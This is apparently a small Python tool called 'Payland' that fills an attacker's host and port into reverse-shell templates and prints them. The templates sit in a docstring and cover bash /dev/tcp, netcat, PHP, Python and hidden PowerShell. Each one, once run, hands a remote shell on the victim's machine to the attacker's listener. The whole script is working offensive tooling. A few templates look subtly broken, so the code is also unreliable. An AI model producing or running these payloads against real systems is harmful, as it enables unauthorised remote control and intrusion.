#! /usr/bin/python

'''

Welcome to payland. here you have some useful payloads iin some formats for reverse shell


'''
import json
pyload_file = open("payloads.json")
pyload_data = json.load(pyload_file)
'''
pyload_data = {

        "bash":["bash -i >& /dev/tcp/%s/%s 0>&1","0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196","/bin/bash -l > /dev/tcp/%sd/%sd 0<&1 2>&1"],
        "netcat":["rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f","nc -e /bin/sh %s %s","nc -e /bin/bash %s %s"],
        "php":["php -r \"'$sock=fsockopen(%s,%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\"","php -r \"'$sock=fsockopen(%s,%s);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\""],
        "python":["python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((%s,%s));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(/bin/sh)'"],
        "powershell":["powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(%s,%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS\" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"]
        }
'''

print("Welcome to Payland")
rhost=input("RHOST=")
rport=input("RPORT=")



print("Which payload format do you want?\n-bash\n-netcat\n-php\n-powershell\n-python")
mypayload=input("?> ")
if mypayload.lower() == "bash":
    for rev in pyload_data["bash"]:
        print(rev % (rhost,rport) )

if mypayload.lower() == "netcat":
    for rev in pyload_data["netcat"]:
        print(rev % (rhost,rport))

if mypayload.lower() == "php":
    for rev in pyload_data["php"]:
        print(rev % (rhost,rport))


if mypayload.lower() == "powershell":
    for rev in pyload_data["powershell"]:
        print(rev % (rhost,rport))



if mypayload.lower() == "python":
    for rev in pyload_data["python"]:
        print(rev % (rhost,rport))
pyload_file.close()
#def getPayload(rhost,rport,payload):





    
